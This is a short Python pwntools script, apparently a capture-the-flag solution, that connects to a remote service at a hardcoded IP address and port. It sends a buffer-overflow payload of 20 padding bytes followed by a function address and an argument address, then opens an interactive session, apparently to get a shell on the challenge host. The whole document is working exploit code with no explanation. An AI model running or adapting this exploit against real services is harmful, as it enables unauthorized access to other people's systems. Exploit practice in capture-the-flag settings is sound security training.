from pwn import *
context(log_level="debug")
#p = process("./02")
p = remote('128.199.220.74', 10001)
p.recvuntil("Are you ready?[Y/N]\n")
p.send("Y\n")
callme_addr = 0x0804852B
shell_addr =  0x08048780
p.recvuntil("So, what's your name:\n")
payload = 'a'*20 +  p32(callme_addr)+p32(0)+ p32(shell_addr)
p.send(payload)
p.interactive()
 
